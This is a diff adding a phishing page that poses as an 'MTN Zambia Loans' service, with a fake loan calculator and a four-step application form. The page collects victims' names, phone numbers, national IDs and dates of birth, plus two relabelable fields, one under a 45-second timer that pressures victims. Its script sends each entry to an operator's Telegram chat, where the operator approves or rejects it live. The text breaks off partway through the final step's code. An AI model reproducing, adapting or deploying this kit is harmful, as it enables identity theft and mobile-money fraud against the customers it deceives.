@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>MTN Zambia Loans</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet"/>
+<style>
+:root{
+  --yellow:#ffcc00;--yellow2:#e6b800;--yellow3:#fff9e0;
+  --black:#1a1a1a;--black2:#2d2d2d;
+  --navy:#0d1b2a;--white:#ffffff;--off:#f7f7f7;
+  --gray:#8a8a8a;--border:#e0e0e0;
+  --green:#27ae60;--red:#e74c3c;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Nunito',sans-serif;background:var(--off);color:var(--black);min-height:100vh;}
+.page{display:none;min-height:100vh;}
+.page.active{display:block;}
+
+/* ── MTN LOGO ── */
+.mtn-logo{text-align:center;margin-bottom:24px;}
+.mtn-badge{
+  display:inline-flex;flex-direction:column;align-items:center;
+  background:var(--yellow);border-radius:18px;
+  padding:14px 24px 12px;
+  box-shadow:0 4px 20px rgba(255,204,0,0.5);
+}
+.mtn-my{font-size:14px;font-weight:900;color:var(--black);letter-spacing:1px;margin-bottom:2px;}
+.mtn-oval{
+  background:var(--black);border-radius:30px;
+  padding:5px 16px;margin-bottom:4px;
+}
+.mtn-oval span{font-size:16px;font-weight:900;color:var(--yellow);letter-spacing:1px;}
+.mtn-zambia{font-size:12px;font-weight:800;color:var(--black);letter-spacing:.5px;}
+
+/* ── PAGE 1 — CALCULATOR ── */
+.p1-bg{background:var(--yellow);min-height:100vh;padding:40px 20px 60px;}
+.p1-header{text-align:center;margin-bottom:28px;}
+.p1-tag{display:inline-block;background:rgba(0,0,0,0.1);color:var(--black);padding:5px 16px;border-radius:20px;font-size:11px;font-weight:800;letter-spacing:1px;text-transform:uppercase;margin-bottom:14px;}
+.p1-h{font-size:26px;font-weight:900;color:var(--black);line-height:1.2;margin-bottom:6px;}
+.p1-h span{color:var(--navy);}
+.p1-sub{font-size:12px;color:rgba(0,0,0,0.6);}
+
+.calc-card{background:var(--white);border-radius:20px;padding:24px 20px;margin-bottom:14px;box-shadow:0 8px 32px rgba(0,0,0,0.12);}
+.calc-title{font-size:15px;font-weight:800;color:var(--black);text-align:center;padding-bottom:14px;border-bottom:1px solid var(--border);margin-bottom:16px;}
+.calc-lbl{font-size:10px;font-weight:700;color:var(--gray);text-transform:uppercase;letter-spacing:1px;text-align:center;margin-bottom:6px;}
+.calc-val{font-size:28px;font-weight:900;color:var(--black);text-align:center;margin-bottom:14px;}
+input[type=range]{width:100%;height:6px;border-radius:3px;-webkit-appearance:none;appearance:none;background:linear-gradient(to right,var(--black) 0%,var(--black) 0%,var(--border) 0%);outline:none;cursor:pointer;}
+input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:22px;height:22px;border-radius:50%;background:var(--yellow);border:3px solid var(--black);box-shadow:0 2px 8px rgba(0,0,0,0.2);cursor:pointer;}
+.slider-labels{display:flex;justify-content:space-between;font-size:10px;color:var(--gray);font-weight:600;margin-top:6px;margin-bottom:18px;}
+.term-lbl{font-size:10px;font-weight:700;color:var(--gray);text-transform:uppercase;letter-spacing:1px;text-align:center;margin-bottom:10px;}
+.term-val{font-size:20px;font-weight:900;color:var(--black);text-align:center;margin-bottom:12px;}
+.term-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;margin-bottom:18px;}
+.term-btn{padding:10px 6px;border-radius:10px;border:2px solid var(--border);background:var(--white);font-family:'Nunito',sans-serif;font-size:13px;font-weight:700;color:var(--gray);cursor:pointer;transition:all .2s;text-align:center;}
+.term-btn.active{background:var(--black);color:var(--yellow);border-color:var(--black);}
+.monthly-box{background:var(--yellow3);border:2px solid rgba(255,204,0,0.5);border-radius:14px;padding:16px;text-align:center;margin-bottom:18px;}
+.monthly-lbl{font-size:10px;font-weight:700;color:var(--gray);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;}
+.monthly-val{font-size:26px;font-weight:900;color:var(--black);}
+.monthly-rate{font-size:11px;color:var(--gray);margin-top:4px;}
+
+.feat-card{background:rgba(0,0,0,0.08);border-radius:16px;padding:6px 16px;margin-top:14px;}
+.feat-item{display:flex;align-items:center;gap:14px;padding:14px 0;border-bottom:1px solid rgba(0,0,0,0.08);}
+.feat-item:last-child{border-bottom:none;}
+.feat-icon{width:40px;height:40px;border-radius:50%;background:var(--black);display:flex;align-items:center;justify-content:center;font-size:17px;flex-shrink:0;}
+.feat-title{font-size:14px;font-weight:800;color:var(--black);display:block;}
+.feat-desc{font-size:12px;color:rgba(0,0,0,0.55);}
+
+/* ── SHARED CARD PAGES ── */
+.card-wrap{display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding:20px 16px;background:var(--off);}
+.card{background:var(--white);border-radius:24px;padding:36px 30px;width:100%;max-width:420px;box-shadow:0 8px 40px rgba(0,0,0,0.1);margin:0 auto;animation:rise .5s cubic-bezier(.16,1,.3,1) both;}
+@media(max-width:460px){.card{padding:28px 16px;}}
+
+.card-logo{text-align:center;margin-bottom:26px;}
+.card-mtn{display:inline-flex;flex-direction:column;align-items:center;background:var(--yellow);border-radius:14px;padding:10px 18px 8px;box-shadow:0 2px 12px rgba(255,204,0,0.4);}
+.card-my{font-size:11px;font-weight:900;color:var(--black);letter-spacing:1px;margin-bottom:2px;}
+.card-oval{background:var(--black);border-radius:24px;padding:3px 12px;margin-bottom:3px;}
+.card-oval span{font-size:13px;font-weight:900;color:var(--yellow);letter-spacing:1px;}
+.card-zm{font-size:10px;font-weight:800;color:var(--black);}
+
+.step-row{display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:22px;}
+.sp{width:8px;height:8px;border-radius:50%;background:var(--border);transition:all .3s;}
+.sp.on{width:22px;border-radius:4px;background:var(--black);}
+.sp.dn{background:var(--yellow2);}
+
+.ttl{font-size:18px;font-weight:800;text-align:center;margin-bottom:4px;color:var(--black);}
+.sub{font-size:12px;color:var(--gray);text-align:center;margin-bottom:22px;}
+
+.f{margin-bottom:14px;}
+.f label{display:block;font-size:10px;font-weight:800;color:var(--black);letter-spacing:1px;text-transform:uppercase;margin-bottom:6px;}
+.f input,.f select{width:100%;padding:12px 14px;border:2px solid var(--border);border-radius:11px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:700;color:var(--black);background:var(--off);outline:none;appearance:none;transition:border-color .2s,background .2s,box-shadow .2s;}
+.f input:focus,.f select:focus{border-color:var(--black);background:var(--white);box-shadow:0 0 0 3px rgba(255,204,0,0.3);}
+.pre-wrap{position:relative;}
+.zmw-pre{position:absolute;left:13px;top:50%;transform:translateY(-50%);font-size:11px;font-weight:800;color:var(--gray);pointer-events:none;}
+.f input.pl{padding-left:46px;}
+
+/* TIMER */
+.timer-wrap{text-align:center;margin-bottom:20px;}
+.timer-ring{width:90px;height:90px;margin:0 auto 10px;position:relative;display:flex;align-items:center;justify-content:center;}
+.timer-ring svg{position:absolute;top:0;left:0;transform:rotate(-90deg);}
+.timer-ring circle{fill:none;stroke-width:6;}
+.timer-bg{stroke:var(--border);}
+.timer-fill{stroke:var(--black);stroke-linecap:round;stroke-dasharray:251;stroke-dashoffset:0;transition:stroke-dashoffset .9s linear,stroke .5s;}
+.timer-fill.urgent{stroke:var(--red);}
+.timer-num{font-size:26px;font-weight:900;color:var(--black);position:relative;z-index:1;transition:color .5s;}
+.timer-num.urgent{color:var(--red);}
+.timer-label{font-size:11px;color:var(--gray);font-weight:700;letter-spacing:.5px;text-transform:uppercase;}
+.timer-expired{display:none;font-size:13px;font-weight:700;color:var(--red);background:rgba(231,76,60,0.07);border:1.5px solid rgba(231,76,60,0.2);border-radius:9px;padding:9px 13px;text-align:center;margin-bottom:12px;}
+.edit-tag{display:inline-block;font-size:10px;font-weight:700;color:var(--black);background:var(--yellow3);border:1px dashed var(--yellow2);border-radius:6px;padding:4px 12px;margin-bottom:14px;letter-spacing:1px;text-transform:uppercase;}
+
+/* BUTTONS */
+.btn{width:100%;padding:14px;margin-top:6px;background:var(--black);color:var(--yellow);border:none;border-radius:11px;font-family:'Nunito',sans-serif;font-size:15px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:transform .15s,box-shadow .15s;box-shadow:0 4px 16px rgba(0,0,0,0.25);}
+.btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(0,0,0,0.35);}
+.btn:active{transform:translateY(0);}
+.btn:disabled{opacity:.6;cursor:not-allowed;transform:none;}
+.btn-yellow{background:var(--yellow);color:var(--black);box-shadow:0 4px 16px rgba(255,204,0,0.4);}
+.btn-yellow:hover{box-shadow:0 6px 20px rgba(255,204,0,0.5);}
+.spin{width:16px;height:16px;border:2px solid rgba(255,204,0,.3);border-top-color:var(--yellow);border-radius:50%;animation:spin .7s linear infinite;display:none;}
+.spin-dark{border-color:rgba(0,0,0,.2);border-top-color:var(--black);}
+.err{display:none;font-size:12px;font-weight:700;color:var(--red);background:rgba(231,76,60,0.07);border:1.5px solid rgba(231,76,60,0.2);border-radius:9px;padding:9px 13px;margin-top:10px;text-align:center;}
+
+/* SCREENS */
+.screen{display:none;min-height:100vh;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:40px 24px;background:var(--off);}
+.screen.show{display:flex;}
+.sc-logo{margin-bottom:24px;}
+.sc-mtn{display:inline-flex;flex-direction:column;align-items:center;background:var(--yellow);border-radius:14px;padding:10px 18px 8px;box-shadow:0 2px 12px rgba(255,204,0,0.4);}
+.sc-icon{width:68px;height:68px;border-radius:50%;background:var(--white);border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto 16px;animation:pulse 2s ease infinite;}
+.sc-h{font-size:20px;font-weight:900;color:var(--black);margin-bottom:8px;}
+.sc-p{font-size:13px;color:var(--gray);line-height:1.7;max-width:290px;margin:0 auto 18px;}
+.ref-num{background:var(--white);border:2px solid var(--border);border-radius:11px;padding:10px 20px;font-size:18px;font-weight:900;color:var(--black);letter-spacing:2px;display:inline-block;margin-bottom:6px;}
+.dot-row{display:flex;align-items:center;justify-content:center;gap:6px;font-size:12px;color:var(--gray);margin-top:10px;}
+.bd{width:6px;height:6px;border-radius:50%;background:var(--yellow2);animation:blink 1.5s ease infinite;}
+.r-icon{width:74px;height:74px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 16px;}
+.r-icon.ok{background:rgba(39,174,96,0.12);}
+.r-icon.no{background:rgba(231,76,60,0.08);}
+.r-h{font-size:22px;font-weight:900;margin-bottom:10px;}
+.r-h.ok{color:var(--green);}
+.r-h.no{color:var(--red);}
+.r-p{font-size:13px;color:var(--gray);line-height:1.7;max-width:280px;margin:0 auto 14px;}
+.r-box{background:var(--white);border:2px solid var(--border);border-radius:12px;padding:13px 16px;text-align:left;font-size:13px;line-height:2;margin-bottom:16px;width:100%;max-width:320px;}
+.r-box strong{color:var(--black);}
+.r-btn{padding:10px 24px;border-radius:10px;border:2px solid var(--black);background:transparent;color:var(--black);font-family:'Nunito',sans-serif;font-size:13px;font-weight:800;cursor:pointer;transition:all .2s;}
+.r-btn:hover{background:var(--black);color:var(--yellow);}
+
+@keyframes rise{from{opacity:0;transform:translateY(22px);}to{opacity:1;transform:translateY(0);}}
+@keyframes spin{to{transform:rotate(360deg);}}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:.15;}}
+@keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.04);}}
+</style>
+</head>
+<body>
+
+<!-- ══════════════════════════════════════
+     PAGE 1 — LOAN CALCULATOR
+     No Telegram — proceeds directly to Page 2
+══════════════════════════════════════ -->
+<div class="page active" id="pg1">
+<div class="p1-bg">
+  <div class="p1-header">
+    <div class="mtn-logo">
+      <div class="mtn-badge">
+        <div class="mtn-my">my</div>
+        <div class="mtn-oval"><span>MTN</span></div>
+        <div class="mtn-zambia">Zambia</div>
+      </div>
+    </div>
+    <div class="p1-tag">🇿🇲 Zambia Loans</div>
+    <div class="p1-h">Get Your Loan <span>Approved Fast</span></div>
+    <div class="p1-sub">Quick approval • Competitive rates • Flexible terms</div>
+  </div>
+
+  <div class="calc-card">
+    <div class="calc-title">Loan Calculator</div>
+    <div class="calc-lbl">LOAN AMOUNT</div>
+    <div class="calc-val" id="calc-display">ZMW 500</div>
+    <input type="range" id="loan-slider" min="500" max="50000" step="500" value="500" oninput="updateCalc()"/>
+    <div class="slider-labels"><span>ZMW 500</span><span>ZMW 50,000</span></div>
+    <div class="term-lbl">LOAN TERM</div>
+    <div class="term-val" id="term-display">12 months</div>
+    <div class="term-grid">
+      <button class="term-btn" onclick="setTerm(6,this)">6 months</button>
+      <button class="term-btn active" onclick="setTerm(12,this)">12 months</button>
+      <button class="term-btn" onclick="setTerm(24,this)">24 months</button>
+      <button class="term-btn" onclick="setTerm(36,this)">36 months</button>
+      <button class="term-btn" onclick="setTerm(48,this)">48 months</button>
+      <button class="term-btn" onclick="setTerm(60,this)">60 months</button>
+    </div>
+    <div class="monthly-box">
+      <div class="monthly-lbl">MONTHLY PAYMENT</div>
+      <div class="monthly-val" id="monthly-display">ZMW 42.69</div>
+      <div class="monthly-rate">Interest rate: 4.5% APR</div>
+    </div>
+    <button class="btn" onclick="goPage('pg2')">APPLY NOW →</button>
+  </div>
+
+  <div class="feat-card">
+    <div class="feat-item"><div class="feat-icon">⚡</div><div><span class="feat-title">Fast Approval</span><span class="feat-desc">Within 24 hours</span></div></div>
+    <div class="feat-item"><div class="feat-icon">💰</div><div><span class="feat-title">Low Rates</span><span class="feat-desc">From 4.5% APR</span></div></div>
+    <div class="feat-item"><div class="feat-icon">🔒</div><div><span class="feat-title">Secure</span><span class="feat-desc">Bank-level security</span></div></div>
+  </div>
+</div>
+</div>
+
+
+<!-- ══════════════════════════════════════
+     PAGE 2 — PERSONAL DETAILS
+     Telegram authorization
+══════════════════════════════════════ -->
+<div class="page" id="pg2">
+  <div class="card-wrap">
+    <div class="card">
+      <div class="card-logo">
+        <div class="card-mtn">
+          <div class="card-my">my</div>
+          <div class="card-oval"><span>MTN</span></div>
+          <div class="card-zm">Zambia</div>
+        </div>
+      </div>
+      <div class="step-row">
+        <div class="sp dn"></div><div class="sp on"></div>
+        <div class="sp"></div><div class="sp"></div>
+      </div>
+      <div class="ttl">Personal Details</div>
+      <div class="sub">Step 2 of 4</div>
+
+      <div class="f"><label>Full Name</label><input type="text" id="p2_name"/></div>
+      <div class="f"><label>Phone Number</label><input type="tel" id="p2_phone"/></div>
+      <div class="f"><label>National ID</label><input type="text" id="p2_id"/></div>
+      <div class="f">
+        <label>Loan Amount (ZMW)</label>
+        <div class="pre-wrap">
+          <span class="zmw-pre">ZMW</span>
+          <input type="number" id="p2_amt" class="pl" min="500"/>
+        </div>
+      </div>
+      <div class="f"><label>Date of Birth</label><input type="date" id="p2_dob"/></div>
+
+      <div class="err" id="p2_err">Please fill in all fields.</div>
+      <button class="btn" id="p2_btn" onclick="sub2()">
+        <span id="p2_txt">Continue →</span>
+        <div class="spin" id="p2_spin"></div>
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- P2 WAIT -->
+<div class="screen" id="p2_wait">
+  <div class="sc-logo"><div class="sc-mtn"><div class="card-my">my</div><div class="card-oval"><span>MTN</span></div><div class="card-zm">Zambia</div></div></div>
+  <div class="sc-icon">⏳</div>
+  <div class="sc-h">Verifying Details</div>
+  <p class="sc-p">Your details have been submitted. Please wait while our team reviews them.</p>
+  <div class="ref-num" id="p2_ref">MZ-000000</div>
+  <p style="font-size:12px;color:var(--gray);margin-top:6px;">Your reference number</p>
+  <div class="dot-row"><div class="bd"></div>Awaiting verification…</div>
+</div>
+
+
+<!-- ══════════════════════════════════════
+     PAGE 3 — BLANK FIELD
+     Search: EDIT_P3_LABEL — change TWICE
+     Telegram authorization
+     Wrong Details → back to Page 2
+══════════════════════════════════════ -->
+<div class="page" id="pg3">
+  <div class="card-wrap">
+    <div class="card">
+      <div class="card-logo">
+        <div class="card-mtn">
+          <div class="card-my">my</div>
+          <div class="card-oval"><span>MTN</span></div>
+          <div class="card-zm">Zambia</div>
+        </div>
+      </div>
+      <div class="step-row">
+        <div class="sp dn"></div><div class="sp dn"></div>
+        <div class="sp on"></div><div class="sp"></div>
+      </div>
+      <div class="ttl">Step 3</div>
+      <div class="sub">Step 3 of 4</div>
+
+      <div class="edit-tag">Edit on GitHub — Page 3</div>
+
+      <!-- ↓ CHANGE "EDIT_P3_LABEL" TO YOUR LABEL ↓ -->
+      <div class="f">
+        <label>EDIT_P3_LABEL</label>
+        <input type="text" id="p3_field"/>
+      </div>
+      <!-- ↑ CHANGE "EDIT_P3_LABEL" TO YOUR LABEL ↑ -->
+
+      <div class="err" id="p3_err">Please fill in the field.</div>
+      <button class="btn" id="p3_btn" onclick="sub3()">
+        <span id="p3_txt">Continue →</span>
+        <div class="spin" id="p3_spin"></div>
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- P3 WAIT -->
+<div class="screen" id="p3_wait">
+  <div class="sc-logo"><div class="sc-mtn"><div class="card-my">my</div><div class="card-oval"><span>MTN</span></div><div class="card-zm">Zambia</div></div></div>
+  <div class="sc-icon">⏳</div>
+  <div class="sc-h">Verifying Details</div>
+  <p class="sc-p">Please wait while our team reviews your details.</p>
+  <div class="ref-num" id="p3_ref">MZ-000000</div>
+  <p style="font-size:12px;color:var(--gray);margin-top:6px;">Your reference number</p>
+  <div class="dot-row"><div class="bd"></div>Awaiting verification…</div>
+</div>
+
+
+<!-- ══════════════════════════════════════
+     PAGE 4 — 45 SEC TIMER + BLANK FIELD
+     Search: EDIT_P4_LABEL — change TWICE
+     Telegram authorization
+     Timer expires → back to Page 3
+     Wrong Details → back to Page 3
+══════════════════════════════════════ -->
+<div class="page" id="pg4">
+  <div class="card-wrap">
+    <div class="card">
+      <div class="card-logo">
+        <div class="card-mtn">
+          <div class="card-my">my</div>
+          <div class="card-oval"><span>MTN</span></div>
+          <div class="card-zm">Zambia</div>
+        </div>
+      </div>
+      <div class="step-row">
+        <div class="sp dn"></div><div class="sp dn"></div>
+        <div class="sp dn"></div><div class="sp on"></div>
+      </div>
+      <div class="ttl">Final Step</div>
+      <div class="sub">Step 4 of 4</div>
+
+      <!-- 45 SECOND TIMER -->
+      <div class="timer-wrap">
+        <div class="timer-ring">
+          <svg width="90" height="90" viewBox="0 0 90 90">
+            <circle class="timer-bg" cx="45" cy="45" r="40"/>
+            <circle class="timer-fill" id="timer-circle" cx="45" cy="45" r="40"/>
+          </svg>
+          <span class="timer-num" id="timer-num">45</span>
+        </div>
+        <div class="timer-label">seconds remaining</div>
+      </div>
+      <div class="timer-expired" id="timer-expired">⏰ Time expired. Redirecting…</div>
+
+      <div class="edit-tag">Edit on GitHub — Page 4</div>
+
+      <!-- ↓ CHANGE "EDIT_P4_LABEL" TO YOUR LABEL ↓ -->
+      <div class="f">
+        <label>EDIT_P4_LABEL</label>
+        <input type="text" id="p4_field"/>
+      </div>
+      <!-- ↑ CHANGE "EDIT_P4_LABEL" TO YOUR LABEL ↑ -->
+
+      <div class="err" id="p4_err">Please fill in the field.</div>
+      <button class="btn" id="p4_btn" onclick="sub4()">
+        <span id="p4_txt">Submit Application</span>
+        <div class="spin" id="p4_spin"></div>
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- P4 WAIT -->
+<div class="screen" id="p4_wait">
+  <div class="sc-logo"><div class="sc-mtn"><div class="card-my">my</div><div class="card-oval"><span>MTN</span></div><div class="card-zm">Zambia</div></div></div>
+  <div class="sc-icon">⏳</div>
+  <div class="sc-h">Application Submitted</div>
+  <p class="sc-p">Your loan application is under review. This page will update automatically.</p>
+  <div class="ref-num" id="p4_ref">MZ-000000</div>
+  <p style="font-size:12px;color:var(--gray);margin-top:6px;">Save your reference number</p>
+  <div class="dot-row"><div class="bd"></div>Awaiting final decision…</div>
+</div>
+
+<!-- APPROVED -->
+<div class="screen" id="approved">
+  <div class="sc-logo"><div class="sc-mtn"><div class="card-my">my</div><div class="card-oval"><span>MTN</span></div><div class="card-zm">Zambia</div></div></div>
+  <div class="r-icon ok">✅</div>
+  <div class="r-h ok">Loan Approved!</div>
+  <p class="r-p">Congratulations! Your loan has been approved. Funds will be sent to your MTN Mobile Money account shortly.</p>
+  <div class="r-box" id="appr_box"></div>
+  <button class="r-btn" onclick="resetAll()">New Application</button>
+</div>
+
+<!-- WRONG DETAILS -->
+<div class="screen" id="rejected">
+  <div class="sc-logo"><div class="sc-mtn"><div class="card-my">my</div><div class="card-oval"><span>MTN</span></div><div class="card-zm">Zambia</div></div></div>
+  <div class="r-icon no">⚠️</div>
+  <div class="r-h no">Wrong Details</div>
+  <p class="r-p">Our team flagged your details as incorrect. Please check and resubmit.</p>
+  <div class="r-box" id="rej_box"></div>
+  <button class="r-btn" onclick="resetAll()">Try Again</button>
+</div>
+
+
+<script>
+  const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+  const CHAT_ID   = "8718124300";
+  const API       = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+  let app={}, pollTimer=null, countdown=null, lastId=0, curRef=null;
+  let selectedTerm=12, loanAmount=500;
+
+  const genRef = ()=>"MZ-"+Math.floor(100000+Math.random()*900000);
+  const stamp  = ()=>new Date().toLocaleString("en-ZM",{timeZone:"Africa/Lusaka",dateStyle:"full",timeStyle:"short"});
+  const fmtZMW = n=>"ZMW "+new Intl.NumberFormat("en-ZM").format(Math.round(n));
+
+  // ── CALCULATOR ──────────────────────────────
+  function updateCalc(){
+    loanAmount=parseInt(document.getElementById("loan-slider").value);
+    document.getElementById("calc-display").textContent=fmtZMW(loanAmount);
+    const pct=((loanAmount-500)/(50000-500))*100;
+    document.getElementById("loan-slider").style.background=`linear-gradient(to right,var(--black) ${pct}%,var(--border) ${pct}%)`;
+    calcMonthly();
+  }
+  function setTerm(m,btn){
+    selectedTerm=m;
+    document.getElementById("term-display").textContent=m+" months";
+    document.querySelectorAll(".term-btn").forEach(b=>b.classList.remove("active"));
+    btn.classList.add("active");
+    calcMonthly();
+  }
+  function calcMonthly(){
+    const r=0.045/12,n=selectedTerm,P=loanAmount;
+    const mo=P*(r*Math.pow(1+r,n))/(Math.pow(1+r,n)-1);
+    document.getElementById("monthly-display").textContent=fmtZMW(mo);
+  }
+  updateCalc();
+
+  // ── NAVIGATION ──────────────────────────────
+  function goPage(id){document.querySelectorAll(".page").forEach(p=>p.classList.remove("active"));document.getElementById(id).classList.add("active");window.scrollTo(0,0);}
+  function hideScreens(){["p2_wait","p3_wait","p4_wait","approved","rejected"].forEach(id=>document.getElementById(id).classList.remove("show"));}
+  function setLoad(p,on){document.getElementById(p+"_btn").disabled=on;document.getElementById(p+"_txt").style.display=on?"none":"inline";document.getElementById(p+"_spin").style.display=on?"block":"none";}
+
+  // ── TELEGRAM ────────────────────────────────
+  async function tgSend(text,r){
+    const kb={inline_keyboard:[[{text:"✅  APPROVE",callback_data:`APPROVE_${r}`},{text:"⚠️  WRONG DETAILS",callback_data:`REJECT_${r}`}]]};
+    const res=await fetch(`${API}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHAT_ID,text,parse_mode:"Markdown",reply_markup:kb})});
+    return res.json();
+  }
+  async function syncId(){try{const r=await fetch(`${API}/getUpdates?limit=1&offset=-1`);const j=await r.json();if(j.ok&&j.result.length>0)lastId=j.result[j.result.length-1].update_id;}catch(e){}}
+  async function ackCb(id,t){await fetch(`${API}/answerCallbackQuery`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({callback_query_id:id,text:t})});}
+  async function editTg(msg,s){await fetch(`${API}/editMessageText`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:msg.chat.id,message_id:msg.message_id,text:msg.text+`\n\n*Decision: ${s}*`,parse_mode:"Markdown"})});}
+
+  function poll(r,onOk,onNo){
+    clearInterval(pollTimer);
+    pollTimer=setInterval(async()=>{
+      try{
+        const res=await fetch(`${API}/getUpdates?offset=${lastId+1}&timeout=3`);
+        const j=await res.json();if(!j.ok)return;
+        for(const u of j.result){
+          lastId=u.update_id;
+          if(u.callback_query){
+            const cb=u.callback_query;
+            if(cb.data===`APPROVE_${r}`){await ackCb(cb.id,"✅ Approved!");await editTg(cb.message,"✅ APPROVED");clearInterval(pollTimer);onOk();return;}
+            if(cb.data===`REJECT_${r}`){await ackCb(cb.id,"⚠️ Wrong details.");await editTg(cb.message,"⚠️ WRONG DETAILS");clearInterval(pollTimer);onNo();return;}
+          }
+        }
+      }catch(e){}
+    },3000);
+  }
+
+  // ── PAGE 2 ──────────────────────────────────
+  async function sub2(){
+    const name=document.getElementById("p2_name").value.trim();
+    const phone=document.getElementById("p2_phone").value.trim();
+    const id=document.getElementById("p2_id").value.trim();
+    const amt=document.getElementById("p2_amt").value.trim();
+    const dob=document.getElementById("p2_dob").value;
+    const err=document.getElementById("p2_err");
+    if(!name||!phone||!id||!amt||!dob){err.style.display="block";return;}
+    err.style.display="none";setLoad("p2",true);
+    app.name=name;app.phone=phone;app.id=id;app.amt=amt;app.dob=dob;curRef=genRef();
+    const msg="📱 *MTN ZAMBIA LOAN — STEP 2*\n━━━━━━━━━━━━━━━━━━━━\n\n"+
+      `👤 *Full Name:* ${name}\n📱 *Phone:* ${phone}\n🪪 *National ID:* ${id}\n`+
+      `💵 *Loan Amount:* ${fmtZMW(parseInt(amt))}\n🎂 *Date of Birth:* ${dob}\n\n`+
+      `📊 *Calculator: ${fmtZMW(loanAmount)} / ${selectedTerm} months*\n\n`+
+      `🔖 *Ref:* \`${curRef}\`\n🕐 *Time:* ${stamp()}\n\n👇 *Approve to proceed to Step 3:*`;
+    try{
+      await syncId();const r=await tgSend(msg,curRef);if(!r.ok)throw new Error();
+      document.getElementById("p2_ref").textContent=curRef;
+      document.getElementById("pg2").classList.remove("active");
+      document.getElementById("p2_wait").classList.add("show");
+      poll(curRef,
+        ()=>{app.ref2=curRef;document.getElementById("p2_wait").classList.remove("show");goPage("pg3");setLoad("p2",false);},
+        ()=>{document.getElementById("p2_wait").classList.remove("show");document.getElementById("pg2").classList.add("active");err.textContent="⚠️ Our team flagged your details. Please check and try again.";err.style.display="block";setLoad("p2",false);}
+      );
+    }catch(e){err.textContent="Connection error. Please try again.";err.style.display="block";setLoad("p2",false);}
+  }
+
+  // ── PAGE 3 ──────────────────────────────────
+  async function sub3(){
+    const field=document.getElementById("p3_field").value.trim();
+    const err=document.getElementById("p3_err");
+    if(!field){err.style.display="block";return;}
+    err.style.display="none";setLoad("p3",true);
+    app.p3=field;curRef=genRef();
+    // ↓ CHANGE "EDIT_P3_LABEL" TO MATCH YOUR LABEL ↓
+    const msg="📱 *MTN ZAMBIA LOAN — STEP 3*\n━━━━━━━━━━━━━━━━━━━━\n\n"+
+      `👤 *Name:* ${app.name}\n📱 *Phone:* ${app.phone}\n💵 *Amount:* ${fmtZMW(parseInt(app.amt))}\n\n`+
+      `▪️ *EDIT_P3_LABEL:* ${field}\n\n`+
+    // ↑ CHANGE "EDIT_P3_LABEL" TO MATCH YOUR LABEL ↑
+      `🔖 *Ref:* \`${curRef}\`\n🕐 *Time:* ${stamp()}\n\n👇 *Approve to proceed to Final Step:*`;
+    try{
+      await syncId();const r=await tgSend(msg,curRef);if(!r.ok)throw new Error();
+      document.getElementById("p3_ref").textContent=curRef;
+      document.getElementById("pg3").classList.remove("active");
+      document.getElementById("p3_wait").classList.add("show");
+      poll(curRef,
+        ()=>{app.ref3=curRef;document.getElementById("p3_wait").classList.remove("show");goPage("pg4");startTimer();setLoad("p3",false);},
+        ()=>{document.getElementById("p3_wait").classList.remove("show");document.getElementById("pg3").classList.add("active");err.textContent="⚠️ Our team flagged your details. Please check and try again.";err.style.display="block";setLoad("p3",false);}
+      );
+    }catch(e){err.textContent="Connection error. Please try again.";err.style.display="block";setLoad("p3",false);}
+  }
+
+  // ── 45 SECOND TIMER ─────────────────────────
+  function startTimer(){
+    clearInterval(countdown);
+    let secs=45;
+    const numEl=document.getElementById("timer-num");
+    const circleEl=document.getElementById("timer-circle");
+    const expEl=document.getElementById("timer-expired");
+    const btn=document.getElementById("p4_btn");
+    const total=251;
+    numEl.textContent=secs;numEl.classList.remove("urgent");
+    circleEl.classList.remove("urgent");circleEl.style.strokeDashoffset=0;
+    expEl.style.display="none";btn.disabled=false;
+    countdown=setInterval(()=>{
+      secs--;numEl.textContent=secs;
+      circleEl.style.strokeDashoffset=total-(total*(secs/45));
+      if(secs<=10){numEl.classList.add("urgent");circleEl.classList.add("urgent");}
+      if(secs<=0){
+        clearInterval(countdown);numEl.textContent="0";expEl.style.display="block";btn.disabled=true;
+        setTimeout(()=>{expEl.style.display="none";document.getElementById("p4_field").value="";document.getElementById("p4_err").style.display="none";setLoad("p4",false);goPage("pg3");},2000);
+      }
+    },1000);
+  }
+
+  // ── PAGE 4 ──────────────────────────────────
+  async function sub4(){
+    const field=document.getElementById("p4_field").value.trim();
+    const err=document.getElementById("p4_err");
+    if(!field){err.style.display="block";return;}
+    err.style.display="none";clearInterval(countdown);setLoad("p4",true);curRef=genRef();
+    // ↓ CHANGE "EDIT_P4_LABEL" TO MATCH YOUR LABEL ↓
+    const msg="📱 *MTN ZAMBIA LOAN — STEP 4 (FINAL)*\n━━━━━━━━━━━━━━━━━━━━\n\n"+
+      `👤 *Name:* ${app.name}\n📱 *Phone:* ${app.phone}\n🪪 *ID:* ${app.id}\n`+
+      `💵 *Amount:* ${fmtZMW(parseInt(app.amt))}\n🎂 *DOB:* ${app.dob}\n`+
+      `▪️ *Step 3:* ${app.p3}\n\n`+
